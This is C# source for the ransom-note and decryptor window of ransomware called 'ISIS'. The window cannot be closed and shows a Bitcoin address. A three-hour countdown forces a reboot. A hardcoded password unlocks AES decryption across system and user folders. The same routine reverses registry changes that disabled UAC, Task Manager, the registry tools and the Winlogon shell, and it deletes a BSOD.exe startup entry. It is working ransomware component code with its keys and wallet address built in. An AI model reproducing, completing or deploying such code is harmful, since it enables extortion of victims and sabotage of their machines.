﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Security.Cryptography;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace ISIS1
{
    public partial class ISIS : Form
    {
        public ISIS()
        {
            InitializeComponent();
        }

        private void ISIS_Load(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void Window_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
        private void Window_Load(object sender, EventArgs e)
        {
            Size = new Size(713, 663);
            label1.Location = new Point(12, 7);
            textBox1.Size = new Size(465, 187);
            textBox1.Location = new Point(221, 55);
            label2.Location = new Point(415, 251);
            textBox3.Size = new Size(271, 120);
            textBox3.Location = new Point(415, 299);
            textBox2.Size = new Size(295, 26);
            textBox2.Location = new Point(12, 362);
            textBox3.Size = new Size(295, 26);
            textBox3.Location = new Point(12, 394);
            button1.Size = new Size(96, 26);
            button1.Location = new Point(313, 362);
            button2.Size = new Size(96, 26);
            button2.Location = new Point(313, 394);
            label5.Location = new Point(35, 433);
            label3.Location = new Point(38, 467);
            label4.Location = new Point(54, 533);
            bitcoin.Location = new Point(377, 474);
            crypto.Location = new Point(377, 512);
            ransom.Location = new Point(377, 550);
            label5.Text = DateTime.Now.ToString("dddd , MMM dd yyyy,hh:mm:ss");
        }

        private void link_bitcoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            ProcessStartInfo sInfo = new ProcessStartInfo("https://en.wikipedia.org/wiki/Bitcoin");
            Process.Start(sInfo);
        }

        private void link_crypto_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            ProcessStartInfo sInfo = new ProcessStartInfo("https://supercoin.it/cz-trading-platform/16228?sorgente=2&gclid=CjwKCAjw3cSSBhBGEiwAVII0Z-8AbRF_QvW-BPUbt_LJ66RruwyMEYjK3QmldW2vvkO4nNPB9oJEMhoCcz4QAvD_BwE");
            Process.Start(sInfo);
        }

        private void link_ransom_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            ProcessStartInfo sInfo = new ProcessStartInfo("https://en.wikipedia.org/wiki/Ransomware");
            Process.Start(sInfo);
        }
        private void btn_decrypt_Click(object sender, EventArgs e)
        {
            if (textBox3.Text == "mypassword") //password for decrypt
            {
                Thread newbackup = new Thread(backup);
                newbackup.Start();
                MessageBox.Show("Correct key, your files were decrypted!", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else if (textBox3.Text == "")
            {
                MessageBox.Show("Incorrect key", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                MessageBox.Show("Incorrect key", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        public void backup()
        {
            //Create file "decrypted" on desktop
            File.Create(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\decrypted");
            //Regs to back
            RegistryKey rk = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);
            RegistryKey key = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            key.SetValue("EnableLUA", 1, RegistryValueKind.DWord);
            RegistryKey dis_taskmgr = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            dis_taskmgr.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
            RegistryKey dis_reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            dis_reg.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);
            RegistryKey logon = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            logon.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
            RegistryKey init = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            init.SetValue("Userinit", @"C:\Windows\System32\userinit.exe", RegistryValueKind.String);
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\BSOD.exe"))
            {
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\BSOD.exe");
            }
            //Char
            char[] mychar = { 'C', 'L', 'U', 'T', 'E', 'R', '.' };
            //Voids
            try
            {
                string[] path_c = Directory.GetFiles(@"C:\");
                foreach (string name_x in path_c)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string[] path_program = Directory.GetFiles(@"C:\Program Files");
                foreach (string name_x in path_program)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string[] path_programx86 = Directory.GetFiles(@"C:\Program Files (x86)");
                foreach (string name_x in path_programx86)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string[] path_users = Directory.GetFiles(@"C:\Users");
                foreach (string name_x in path_users)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string[] path_win = Directory.GetFiles(@"C:\Windows");
                foreach (string name_x in path_win)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string[] path_sys = Directory.GetFiles(@"C:\Windows\System32");
                foreach (string name_x in path_sys)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_app = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string[] path_app_F = Directory.GetFiles(path_app);
                foreach (string name_x in path_app_F)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_userprof = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string[] path_userprof_F = Directory.GetFiles(path_userprof);
                foreach (string name_x in path_userprof_F)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_mydoc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                string[] path_mydoc_F = Directory.GetFiles(path_mydoc);
                foreach (string name_x in path_mydoc_F)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_mymus = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
                string[] path_mymus_F = Directory.GetFiles(path_mymus);
                foreach (string name_x in path_mymus_F)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_mypic = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
                string[] path_mypic_F = Directory.GetFiles(path_mypic);
                foreach (string name_x in path_mypic_F)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_myvids = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
                string[] path_myvids_F = Directory.GetFiles(path_myvids);
                foreach (string name_x in path_myvids_F)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string path_des = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string[] path_des_F = Directory.GetFiles(path_des);
                foreach (string name_x in path_des_F)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                string[] path_dis = { @"A:\", @"B:\", @"D:\", @"E:\", @"F:\", @"G:\", @"H:\", @"CH:\", @"I:\", @"J:\", @"K:\", @"L:\", @"M:\", @"N:\",
                @"O:\", @"P:\", @"Q:\", @"R:\", @"S:\", @"T:\", @"U:\", @"V:\", @"W:\", @"X:\", @"Y:\", @"Z:\"};
                foreach (string name_x in path_dis)
                {
                    try
                    {
                        DecryptFile(name_x, name_x.TrimEnd(mychar));
                        File.Delete(name_x);
                    }
                    catch { }
                }
            }
            catch { }
            Hide(); //Just hide window
        }

        int delay = 10800;
        private void timer1_Tick(object sender, EventArgs e)
        {
            if (delay >= 0)
            {
                TimeSpan time = TimeSpan.FromSeconds(delay -= 1);
                label4.Text = time.ToString(@"hh\:mm\:ss");
            }
            else
            {
                ProcessStartInfo restart = new ProcessStartInfo();
                restart.FileName = "shutdown.exe";
                restart.WindowStyle = ProcessWindowStyle.Hidden;
                restart.Arguments = "shutdown /r /t 0";
                Process.Start(restart);
                Environment.Exit(-1);
            }
        }

        private void DecryptFile(string inputFile, string outputFile)
        {
            try
            {
                string password = @"isisransom";

                UnicodeEncoding UE = new UnicodeEncoding();
                byte[] key = UE.GetBytes(password);

                FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);

                RijndaelManaged RMCrypto = new RijndaelManaged();

                CryptoStream cs = new CryptoStream(fsCrypt,
                    RMCrypto.CreateDecryptor(key, key),
                    CryptoStreamMode.Read);

                FileStream fsOut = new FileStream(outputFile, FileMode.Create);

                int data;
                while ((data = cs.ReadByte()) != -1)
                    fsOut.WriteByte((byte)data);

                fsOut.Close();
                cs.Close();
                fsCrypt.Close();

            }
            catch { }
        }

        private void lbl_count_Click(object sender, EventArgs e)
        {

        }

        private void btn_copy_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(() => Clipboard.SetText("1Bq8Q485FPVSwZq89vMxVhbxzoEfwNcZ52"));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
            thread.Join();
        }

        private void timer1_Tick_1(object sender, EventArgs e)
        {

        }
    }
}

    

